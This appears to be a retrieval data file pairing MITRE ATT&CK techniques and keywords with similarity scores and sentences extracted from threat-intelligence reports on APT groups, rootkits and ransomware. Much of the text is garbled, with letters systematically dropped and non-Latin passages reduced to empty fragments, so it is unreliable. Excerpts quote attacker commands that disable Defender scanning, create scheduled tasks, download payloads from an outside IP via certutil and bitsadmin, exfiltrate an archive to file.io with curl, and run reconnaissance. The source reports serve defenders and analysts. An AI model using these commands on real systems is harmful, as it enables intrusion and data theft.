Scheduled Task/Job: Scheduled Task If the user doesnt have admin privileges, PhantomNet persists via a scheduled task.', 'T1543.03 Create or Modify System Proces: Windows Service If the user has admin privileges, PhantomNet persists via a Windows service.', 'Discovery T103 System Owner/User Discovery PhantomNet implements a function to retrieve the username.', 'T1082 System Information Discovery PhantomNet implements a function to retrieve the OS version.', 'Comand and T1090.01 Proxy: Internal Proxy PhantomNet can retrieve the proxy configuration of the default browser and use it to conect to the C&C Control server.', 'htps:/w.welivesecurity.com/2020/12/17/operation-signsight-suply-chain-atack-southeast-asia/ 5/6 12/18/2020 Operation SignSight: Suply-chain atack against a certification authority in Southeast Asia | WeLiveSecurity Tactic ID Name Description T1071.01 Aplication Layer Protocol: Web Protocols PhantomNet uses HTPS.']"
399c17d5f44d8b855c9751aae73f3c11,Scheduled Task/Job: Scheduled Task,0.75047330475321,[]
399c17d5f44d8b855c9751aae73f3c11,Scheduled Task/Job: Scheduled Task,0.8048177502868578,"['The atackers sent their victims archives containing malicious executable files whose names ended with PDF so that the victim would think it was a real document and open the file.', ""Figure 34 Phishing email Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Initial Aces TA01 | Phishing: Spearphishing Atachment T156.01 Contents 81 After the malicious file named paymentSlip.pdf.exe was run on the victim's computer, several files were saved to shared directories."", 'Then the atackers ran PowerShel and aded these files to the MS Windows Defender exclusions list.', '""$windir\\$system32\\WindowsPowerShel\\v1.0\\PowerShel.exe"" Ad-MpPreference -ExclusionPath ""$user\\$apdata\\aPCyDwLsApDgb.exe"" (MITRE: T1562.01 Impair Defenses: Disable or Modify Tols).', 'After that, they used the standard tol named schtasks.exe to create scheduled tasks, and one of the files previously droped onto the computer served as the configuration file for these tasks.', '""$windir\\$system32\\schtasks.exe"" /Create /TN ""Updates\\aPCyDwLsApDgb"" /XML ""$user\\$temp\\tmp8ACB.tmp"" (MITRE: T1053.05 Scheduled Task/Job: Scheduled Task).', 'Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Initial Aces TA01 | Phishing: Spearphishing Atachment T156.01 Contents 82 Example launch of malware in Kaspersky Sandbox: Figure 35 Ilustration of an Execution Graph in TIP Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Initial Aces TA01 | Phishing: Spearphishing Atachment T156.01 Contents 83 Example 3 Another similar example of a phishing email.', 'The email contains two atached archives: Figure 36 Phishing email When 25th April_PDF.exe is run, it uses PowerShel to change the configuration of Windows Defender: ""$windir\\$system32\\WindowsPowerShel\\v1.0\\PowerShel.exe"" Ad-MpPreference -ExclusionPath ""$selfpath\\$selfname.exe"" (MITRE: T1562.01 Impair Defenses: Disable or Modify Tols).', 'Then it creates a task in the scheduler to achieve persistence: ""$windir\\$system32\\schtasks.exe"" /Create /TN ""Updates\\htOTEVF"" /XML ""$user\\$temp\\tmp56EA.', 'tmp"" (MITRE: T1053.05 Scheduled Task/Job: Scheduled Task).', 'Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Initial Aces TA01 | Phishing: Spearphishing Atachment T156.01 Contents 84 Figure 37 Ilustration of an Execution Graph in TIP The 24th April_PDF.exe sample also ads itself to Windows Defender exclusions, then gathers acount credentials from browsers: Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Initial Aces TA01 | Phishing: Spearphishing Atachment T156.01 Contents 85 Figure 38 Ilustration of an Execution Graph in TIP Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Initial Aces TA01 | Phishing: Spearphishing Atachment T156.01 Contents 86 Figure 39 Atack scenario Droped EXE Start Exclude power malware shel Atachment Contains Masquerading extension PDF EXE Phishing RAR EXE email Droped TMP Importing task Create scheduled task Detection The folowing aproaches are used to detect phishing: Deployment of Secure Email Gateway solutions with dynamic technologies (sandbox) for scaning atachments in emails Analyzing web trafic and identifying suspicious websites that may be linked to phishing atacks by means of malware detection and monitoring systems Giving users the capability to report suspicious emails or websites that they believe are phishing.']"
b6848f0571b4f8a7d1ed82ce6ec8a4e8,Scheduled Task/Job: Scheduled Task,0.7623350644100977,"['If we observe activity that canot be atributed to a known entity, we refer to the threat actor as a dev set to facilitate further development and analysis, and in some cases we wil asign a named set to a dev set if our analysis results in an atribution asesment.', 'Where we se overlaps in atribution betwen our research and other organisations, we provide the respective threat actor names.', 'Key terms and phrases concerning threat actors Cyber criminal -as-a-Service oferings: Cyber criminal services which are developed and then advertised for use in exchange for payment, such as the folowing included in this report: Aces-as-a-Service (AaS): The criminal service ofering which charges customers for aceses to networks, predominantly corporate.', 'This type of ofering can be divided into the folowing two categories: Initial aces broker (IAB): A cyber criminal who sels login credentials to exposed Internet-facing infrastructure, such as remote desktop protocol (RDP) and virtual private networks (VPNs), to customers.', 'Malware delivery system: A criminal service which uploads a customers malware onto a compromised host as a secondary payload, such as White Taranis via Emotet and White Horoja via Qakbot.', '- pg.', '45-48 Distributed Denial of Service-for-hire (DoS-for-hire): The criminal service ofering where cyber criminals pay a fe to an ilicit capability to conduct DoS atacks, such as Blue Kurama (a.k.a.', 'Kilnet) which started as a DoS-for-hire capability.', '- pg.', '19 72 | Cyber Threats 202: A Year in Retrospect Phishing-as-a-Service (PHaS): The criminal service ofering where cyber criminals pay a fe to an ilicit phishing capability to send phishing emails, such as EvilProxy, Cafeine and Robin Banks tolkits.', '- pg.']"
f6c926edfa0eb75e375214e6fe43fa2f,Exploitation for Privilege Escalation,0.8312569646392747,"['Furthermore, the group showed mature capabilities for tuneling trafic and overjumping air gaps, respectively internet isolation of systems and networks.', 'The main lesons learned are: 1.', 'Entry point is very often the user.', 'The atackers use also diferent comunication media, like LinkedIn or WhatsAp and company mail.', 'Companies should train their users to detect and prevent spear phishing atacks and provide a clear and easy to use reporting proceses.', '2.', 'Although the technical level of the atackers is quite advanced, basic protective measures like automaticaly updated URL block lists in the proxy help with early detection and slowing down of such atacks.', '3.', 'If you recognize similar TPs or IOCs in your infrastructure, you should cary out very serious incident analysis, before trying to contain the incident.', 'Otherwise, evidence may be gone, and atackers stil might have aces to the network.', 'As in case of reinfection, the atackers reuse previously compromised asets.']"
e1baf1d01587423eb4aa184c8327f15f,Exploitation for Privilege Escalation,0.8312569646392747,"['1 6.5 Privilege Escalation .', '17 6.6 Defense Evasion .', '17 THE CHANGING THREAT LANDSCAPE IN 2021 .', '2 6.7 Credential Aces .', '19 1 Just Another Incident Response investigation?', '.', '2 6.8 Discovery .', '19 2 The Major Vulnerabilities in 2021 .', '3 6.9 Lateral Movement .', '20 6.10 Colection .', '20 3 A Spotlight on the Role of APT Groups .']"
5518f123e0610a71173f98d2a79b34ec,Exploitation for Privilege Escalation,0.8312569646392747,"['By 2023, it was two daysa ful wek les.', 'Especialy striking is how often atackers move quickly.', 'In almost 45% of our cases this year, atackers exfiltrated data in les than a day after compromise.', 'This means that almost half the time, organizations must respond within hours to stop them.', '3 Spotlight On: Sped Incident Response Report 2024 Casefile: Black Basta Ransomware How many minutes it can take for an atacker.', 'Phishing email starts the clock Initial entry starts: +30 minutes after phishing email Reconaisance starts: +15 minutes after initial entry (45 minutes elapsed) Privilege escalation and C2 starts: +45 minutes after recon (90 minutes elapsed) Exfiltration starts: +390 minutes after priv esc/C2 (8 hours elapsed) Acount modification starts: +80 minutes after exfil (9 hours and 20 minutes elapsed) Ransomware prep starts: +130 minutes after acount mod (1 hours and 30 minutes elapsed) Ransomware deployment starts: +125 minutes after prep starts (13 hours and 35 minutes elapsed) Figure 7.', 'In les than 14 hours, atackers gained aces to an organization, exfiltrated terabytes of data, and deployed ransomware to nearly 10,0 endpoints.', 'In certain kinds of cases, exfiltration hapens In one case involving Black Basta ransomware, it even faster.', 'While we expected that extortion tok atackers les than 14 hours to acomplish cases would be the fastest to exfiltration, that extensive compromise.', 'Starting with a simple wasnt the case.', 'In maters that dont involve phishing email, the threat group gained initial extortion, atackers are working within hours more entry to the organization a mere half hour later.']"
d5019121cbc645eb0787efab173a12b3,exploiting vulnerabilities in the remote desktop protocol (RDP).,0.7539985150857968,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
31347d89b18461f35448b26fefb00133,“cmd /c,0.8135172745614935,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
d5019121cbc645eb0787efab173a12b3,“cmd /c,1.0,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
6676698d65e372feb79c0159d9d2b11e,“cmd /c,0.8135172745614935,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
2f9cb1419d88d162b0fe29430bf53db3,Malware Obfuscation,0.8841982676041403,"['ESET Research White papers / July 2019 MACHETE JUST GOT SHARPER Venezuelan military under atack How spies managed to steal gigabytes of confidential data over the course of a year TABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.', '.', '.']"
2f9cb1419d88d162b0fe29430bf53db3,Malware Obfuscation,0.8841982676041403,"['ESET Research White papers / July 2019 MACHETE JUST GOT SHARPER Venezuelan military under atack How spies managed to steal gigabytes of confidential data over the course of a year TABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.', '.', '.']"
2f9cb1419d88d162b0fe29430bf53db3,Malware Obfuscation,0.8841982676041403,"['ESET Research White papers / July 2019 MACHETE JUST GOT SHARPER Venezuelan military under atack How spies managed to steal gigabytes of confidential data over the course of a year TABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.', '.', '.']"
b061b87a72eab24273ab0a1d4675966b,"malware
also checks that the operating system version",0.7758607464961542,"['One pair was compiled in early August 2017 and the second pair was compiled ten days later.', 'Al four driver samples are digitaly signed with stolen certificates from game development companies, either the US-based Frostburn Studios or the Korean 43CR Company (43 ).', 'The signatures made with Frostburn Studios certificate are even timestamped.', 'Figure 8: Digital signature of a crtsys.sys driver Two of the samples are on VirusTotal and have a very low detection rate.', 'htps:/w.fortinet.com/blog/threat-research/dep-panda-log4shel-fire-chili-rotkits 5/16 4/27/2, 3:49 PM New Milestones for Dep Panda: Log4Shel and Digitaly Signed Fire Chili Rotkits Figure 9: Detection rates of the rotkit samples from VirusTotal The rotkit starts by ensuring the victim machine is not runing in safe mode.', 'It then checks the operating system version.', 'The rotkit uses Direct Kernel Object Modification (DKOM), which involves undocumented kernel structures and objects, for its operations.', 'For this reason, it relies on specific OS builds as otherwise it may cause the infected machine to crash.', 'In general, the latest suported build is Windows 10 Creators Update (Redstone 2), released in April 2017.', 'The purpose of the driver is to hide and protect malicious artifacts from user-mode components.', 'This includes four aspects: files, proceses, registry keys and network conections.']"
694d28159243554ebe634f76a1fad32b,"malware
also checks that the operating system version",0.7758607464961542,"['One pair was compiled in early August 2017 and the second pair was compiled ten days later.', 'Al four driver samples are digitaly signed with stolen certificates from game development companies, either the US-based Frostburn Studios or the Korean 43CR Company (43 ).', 'The signatures made with Frostburn Studios certificate are even timestamped.', '5/14 Figure 8: Digital signature of a crtsys.sys driver Two of the samples are on VirusTotal and have a very low detection rate.', 'Figure 9: Detection rates of the rotkit samples from VirusTotal 6/14 The rotkit starts by ensuring the victim machine is not runing in safe mode.', 'It then checks the operating system version.', 'The rotkit uses Direct Kernel Object Modification (DKOM), which involves undocumented kernel structures and objects, for its operations.', 'For this reason, it relies on specific OS builds as otherwise it may cause the infected machine to crash.', 'In general, the latest suported build is Windows 10 Creators Update (Redstone 2), released in April 2017.', 'The purpose of the driver is to hide and protect malicious artifacts from user-mode components.', 'This includes four aspects: files, proceses, registry keys and network conections.']"
01be204435044a83ae8553bc754a2b98,Mimikatz,1.0,"['2013 CVE-2013-063 CVE- 2013-0634 (Ladyboyle)1.23 2016 4 (Symantec) (Tick) 4, 1 LAC .5 2017 6 (SecureWorks) (Bronze Butler)6 , 7 7 1 8 .', '2018 6 42 USB .9 2014 .', '208 .', 'IT .', ', USB .', '.', '.', '1 htps:/w.symantec.com/conect/blogs/adobe-zero-day-used-ladyboyle-atack 2 htps:/w.fireye.com/blog/threat-research/2013/02/lady-boyle-comes-to-town-with-a-new-exploit.html 3 htps:/asec.ahnlab.com/912 4 htps:/w.symantec.com/conect/blogs/tick-cyberespionage-group-zeros-japan 5 htps:/w.lac.co.jp/english/report/2016/1/04_cgview_01.html 6 htps:/w.secureworks.com/research/bronze-butler-targets-japanese-busineses 7 htps:/unit42.paloaltonetworks.com/unit42-tick-group-continues-atacks/ 8 htps:/blog.trendmicro.com/trendlabs-security-inteligence/redbaldknight-bronze-butler-daserf-backdor-now-using- steganography/ 9 htps:/unit42.paloaltonetworks.com/unit42-tick-group-weaponized-secure-usb-drives-target-air-gaped-critical-systems/ AhnLab, Inc. Al rights reserved.', '3 Analysis Report_Tick Group 2014 .', ', , , , , , , IT .', ', MS , .']"
8f9fe74d1fa133e5e48b7e2f4d94214a,Mimikatz,0.759498461070385,"['The threat actors use built-in Windows administration tols and comercial of- the-shelf software to live of the land.', 'The threat actor at the keyboard uses RDP to aces compromised systems rather than a backdor or Remote Aces Trojan (RAT).', 'Post-exploitation persistence is maintained by harvesting paswords from a wide variety of sources such as proces memory, web browsers, network snifing, and keylogers.', 'There is no evidence of data theft, leaving the motivation behind Stolen Pencil largely uncertain.', 'Observed Sectors: Education and Think Tanks.', 'Tols used Mimikatz.', 'Information <htps:/w.netscout.com/blog/asert/stolen-pencil-campaign-targets-academia> <htps:/unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national- security-think-tanks/> MITRE AT&CK <htps:/atack.mitre.org/groups/G086/> 219 Threat Group Cards: A Threat Actor Encyclopedia Stone Panda, APT 10, menuPas Names Stone Panda (CrowdStrike) APT 10 (Mandiant) menuPas Team (Symantec) menuPas (Palo Alto) Red Apolo (PwC) CVNX (BAE Systems) Potasium (Microsoft) Hogfish (iDefense) Hapyongzi (FireEye) Country China Motivation Information theft and espionage Description menuPas is a threat group that apears to originate from China and has ben active since aproximately 209.', 'The group has targeted healthcare, defense, aerospace, and government sectors, and has targeted Japanese victims since at least 2014.', 'In 2016 and 2017, the group targeted managed IT service providers, manufacturing and mining companies, and a university.', 'Observed Sectors: Aerospace, Defense, Government, Healthcare, MSPs and Pharmaceutical.', 'Countries: Australia, Brazil, Canada, Finland, France, India, Japan, Norway, Philipines, South Africa, South Korea, Sweden, Switzerland, Thailand, UK and USA.']"
d5019121cbc645eb0787efab173a12b3,Mimikatz,1.0,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
d5019121cbc645eb0787efab173a12b3,Mimikatz,1.0,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
ce2dca3dccbd8b655ff8ba8d06f2d408,Mimikatz,0.759498461070385,"['The threat actors use built-in Windows administration tols and comercial of- the-shelf software to live of the land.', 'The threat actor at the keyboard uses RDP to aces compromised systems rather than a backdor or Remote Aces Trojan (RAT).', 'Post-exploitation persistence is maintained by harvesting paswords from a wide variety of sources such as proces memory, web browsers, network snifing, and keylogers.', 'There is no evidence of data theft, leaving the motivation behind Stolen Pencil largely uncertain.', 'Observed Sectors: Education and Think Tanks.', 'Tols used Mimikatz.', 'Information <htps:/w.netscout.com/blog/asert/stolen-pencil-campaign-targets-academia> <htps:/unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national- security-think-tanks/> MITRE AT&CK <htps:/atack.mitre.org/groups/G086/> 219 Threat Group Cards: A Threat Actor Encyclopedia Stone Panda, APT 10, menuPas Names Stone Panda (CrowdStrike) APT 10 (Mandiant) menuPas Team (Symantec) menuPas (Palo Alto) Red Apolo (PwC) CVNX (BAE Systems) Potasium (Microsoft) Hogfish (iDefense) Hapyongzi (FireEye) Country China Motivation Information theft and espionage Description menuPas is a threat group that apears to originate from China and has ben active since aproximately 209.', 'The group has targeted healthcare, defense, aerospace, and government sectors, and has targeted Japanese victims since at least 2014.', 'In 2016 and 2017, the group targeted managed IT service providers, manufacturing and mining companies, and a university.', 'Observed Sectors: Aerospace, Defense, Government, Healthcare, MSPs and Pharmaceutical.', 'Countries: Australia, Brazil, Canada, Finland, France, Germany, India, Japan, Netherlands, Norway, Philipines, South Africa, South Korea, Sweden, Switzerland, Thailand, UAE, UK and USA.']"
c91a9ca760ed281ab3a6e831ccac7850,Mimikatz,0.751353105890179,"['(RDP) .', '41 3.6.', 'Pas-the-hash, Pas-the-ticket .', '42 3.6.1.', 'WCE () .', '42 1 3.6.2.', 'Mimikatz() .', '4 3.7.', 'SYSTEM .', '45 3.7.1.', 'MS14-058 Exploit .']"
c91a9ca760ed281ab3a6e831ccac7850,Mimikatz,0.751353105890179,"['(RDP) .', '41 3.6.', 'Pas-the-hash, Pas-the-ticket .', '42 3.6.1.', 'WCE () .', '42 1 3.6.2.', 'Mimikatz() .', '4 3.7.', 'SYSTEM .', '45 3.7.1.', 'MS14-058 Exploit .']"
c91a9ca760ed281ab3a6e831ccac7850,Mimikatz,0.7778430984306982,"['PWDumpX .', '26 3.3.3.', 'Quarks PwDump .', '28 3.3.4.', 'Mimikatz () .', '29 3.3.5.', 'Mimikatz () .', '30 3.3.6.', 'WCE.', '31 3.3.7. gsecdump .', '32 3.3.8. lslsas .']"
c91a9ca760ed281ab3a6e831ccac7850,Mimikatz,0.7778430984306982,"['PWDumpX .', '26 3.3.3.', 'Quarks PwDump .', '28 3.3.4.', 'Mimikatz () .', '29 3.3.5.', 'Mimikatz () .', '30 3.3.6.', 'WCE.', '31 3.3.7. gsecdump .', '32 3.3.8. lslsas .']"
c91a9ca760ed281ab3a6e831ccac7850,Mimikatz,0.7815683517204072,"[' JPCERT 2016 6 28 1.', '.4 2.', '.5 2.1. .', '5 2.2. .', '6 2.3. .', '8 3.', '.9 3.1. .', '9 3.2.', '.1 1 3.2.1.', 'PsExec .1 1 3.2.2. wmic .', '13 3.2.3.']"
c91a9ca760ed281ab3a6e831ccac7850,Mimikatz,0.7815683517204072,"[' JPCERT 2016 6 28 1.', '.4 2.', '.5 2.1. .', '5 2.2. .', '6 2.3. .', '8 3.', '.9 3.1. .', '9 3.2.', '.1 1 3.2.1.', 'PsExec .1 1 3.2.2. wmic .', '13 3.2.3.']"
07e8e26ab8196bb14d491205902c10a7,Mimikatz,0.7693334627892614,"['2-2 2.2 APT3 Tol Functionality .', '2-4 2.2.1 Pirpi Functions .', '2-4 2.2.2 PlugX Functions.', '2-6 2.2.3 OSInfo Functions .', '2-7 2.2.4 Pwdump Functions.', '2-9 2.2.5 Mimikatz Functions .', '2-9 2.2.6 RemoteCMD Functions .', '2-9 2.2.7 Dsquery Functions .', '2-9 2.2.8 LaZagne Functions.', '2-10 2.2.9 ScanBox Functions .', '2-10 Emulation Phases .']"
920bbf3f4cf30cf9c556531074485448,cmd.exe,0.8176210416244082,"['25 EDR/Security bypas tols .', '27 Comand file tol .', '29 Incident investigation .', '30 Technical details part 2.', 'In-the-field analysis results.', '.', '31 Linux MATA generation 3 .', '32 Discovery .', '32 Lateral movement .', '32 Abusing security compliance solution .', '3 Abusing the anti-malware solution .']"
31347d89b18461f35448b26fefb00133,cmd.exe,1.0,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
399c17d5f44d8b855c9751aae73f3c11,cmd.exe,0.8937965527573956,"['These files provide sequential execution of comands using algorithmic structures such as conditional operators and lops.', 'Seing as how cmd.exe is employed by atackers in a large number of cases and overlaps with other techniques of the MITRE AT&CK matrix, here we wil examine only a few examples of cmd.exe use at diferent stages of an atack without delving to dep into the details of each example.', 'We give a detailed breakdown of the mentioned procedures in their coresponding techniques.', 'Examples of procedures Example 1 Lateral Tol Transfer via SMB.', 'Atackers use the copy comand to copy the contents of the curent folder to a remote host (the copied files contain the tols and malware that the atacker neds): $system32\\cmd.exe /C copy * \\<remote_ip>\\C$\\windows\\help\\help Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 90 Example 2 After gaining aces to the system, the atackers conduct reconaisance.', 'Similar to the procedures in the described incidents, the operator executes reconaisance comands from cmd.exe: cmd.exe /C netstat -ano cmd.exe /C systeminfo cmd.exe /C whoami cmd.exe /C net view \\<hostname> cmd.exe /C tasklist /v cmd.exe /C arp -a cmd.exe /C net use cmd.exe /C ping <host> -n <count> cmd.exe /C net user <username> /dom cmd.exe /C net group domain admins /dom cmd.exe /C echo list volume | diskpart Example 3 Atackers use cmd.exe to run their malware: cmd /c $system32\\conhost64.exe Example 4 Atackers use cmd.exe to download the tols that they wil use in subsequent stages of an atack to the compromised system: cmd.exe /c bitsadmin /transfer n hxp:/8.210.141[.', ']104:809/1.txt $public\\Downloads\\1.txt cmd.exe /c certutil -urlcache -split -f hxp:/8.210.141[.', ']104:809/MEUpdate.exe $windir\\Help\\Help\\MEUpdate.exe Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 91 Example 5 Operators exfiltrate the colected data to an external service: cmd.exe /C curl -F ""file=@$selfpath\\1.rar"" -sl-no-revoke htps:/file.io Example 6 Atackers employ their own batch scripts to perform repetitive actions on a local host and remote ones.', 'Here is a fragment of one script (MD5: 78E8B01C74DA6E0B8A10281C3B13D5B6): Figure 40 Script fragment Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 92 The script gathers data on the system and saves this data to files, then ads them to an archive.', 'Here are al the reconaisance comands employed in the script: ver > :\\Windows\\Web\\systeminfo.txtb time /t > :\\Windows\\Web\\systeminfo.txtb date /t > :\\Windows\\Web\\systeminfo.txtb hostname > :\\Windows\\Web\\systeminfo.txtb systeminfo > :\\Windows\\Web\\systeminfo.txtb net localgroup Administrators > :\\Windows\\Web\\systeminfo.txtb ipconfig /al > :\\Windows\\Web\\systeminfo.txtb tasklist /v > :\\Windows\\Web\\systeminfo.txtb tasklist -svc > :\\Windows\\Web\\systeminfo.txtb net start > :\\Windows\\Web\\systeminfo.txtb ping w.yandex.ru > :\\Windows\\Web\\systeminfo.txtb tracert -h 5 w.yandex.ru > :\\Windows\\Web\\systeminfo.txtb netstat -aon > :\\Windows\\Web\\systeminfo.txtb netstat -bv > :\\Windows\\Web\\systeminfo.txtb net use > :\\Windows\\Web\\systeminfo.txtb net share > :\\Windows\\Web\\systeminfo.txtb net view > :\\Windows\\Web\\systeminfo.txtb net view /domain > :\\Windows\\Web\\systeminfo.txtb net group /domain > :\\Windows\\Web\\systeminfo.txtb net user > :\\Windows\\Web\\systeminfo.txtb net user /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain controlers"" /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain admins"" /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain computers"" /domain > :\\Windows\\Web\\systeminfo.txtb nltest /domain_trusts > :\\Windows\\Web\\systeminfo.txtb route print > :\\Windows\\Web\\systeminfo.txtb arp -a > :\\Windows\\Web\\systeminfo.txtb dir /a ""c:\\program files\\*.', '*"" > :\\Windows\\Web\\systeminfo.txtb dir /a ""c:\\Program Files (x86)\\*.']"
cd55962babfd80de741da3cfcd92ebe3,cmd.exe,0.82672272449881,"['It is worth noting that these samples were al compiled after the domain began being used alongside the knf.gov[.', ']pl watering-hole.', 'Aditionaly, the samples uploaded from Poland and Uruguay match with the watering-hole activity observed sugesting this is al part of the same campaign.', 'Despite this potential conection to the Poland bank compromises, the malware is not particularly advanced for example using basic operations to gather system information.', 'The malware atempts to run a series of comands with cmd.exe and then returns the result via the C&C, eye-watch[.]in.', 'These comands are as folows: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -al cmd.exe /c ping w.gogle.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query ""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Internet Setings"" cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find ""TCP"" An example C&C beacon is sen below: GET /design/dfbox/list.jsp?action=What&u=10729854751740 HTP/1.1 Conection: Kep-Alive User-Agent: Mozila/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/2010101 Firefox/47.0 Host: w.eye-watch[.', ']in SILVERLIGHT XAP FILE The cambio.xap archive sample (4c10ab3f4e6769e520694a10f61d5) does not use eye-watch[.', ']in as a C&C chanel but instead was downloaded from the URL: hxps:/w.eye-watch[.', ""]in/design/fancybox/include/cambio.xap 'cambio' is Spanish for 'change'."", 'The URL is similar to that noted in the BadCyber blog, and the use of an XAP file matches what can be found in the Archive.org cache for the sap.misapor[.', ']ch site.']"
4cfa49159667f23c95faae1778231c91,cmd.exe,0.845503132152836,"['Modular architecture of the victims infection proces provides both aditional flexibility and anonymity throughout the cyber-atack.', 'This scheme alows hackers to divide software development activity betwen teams, as wel as to ensure the reuse of program code.', 'Recon Performs initial reconaisance to determine if a systems is of interest to the threat actors Droper Extracts and decrypts Loader Loader Decrypts the payload Client_RAT or Client_TraficForwarder and injects into the legitimate proces Client_TraficForwarder Forwards operators comands from external network into corporate network Client_RAT Provides ful control over the target system Recon is a backdor that is initialy instaled on the target machine through sucesful execution of exploits.', 'This module is used by hackers to perform initial reconaisance to search for systems of interest.', 'Once launched, the program ads itself to the auto-start by copying its file to the directory ""%USERPROFILE%\\ApData\\Roaming\\Microsoft\\Windows\\ Start Menu\\Programs\\Startup"", colects data about the system and network environment and sends them to the C&C server.', 'Below is a list of data colected: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -al cmd.exe /c ping w.gogle.com cmd.exe /c query user 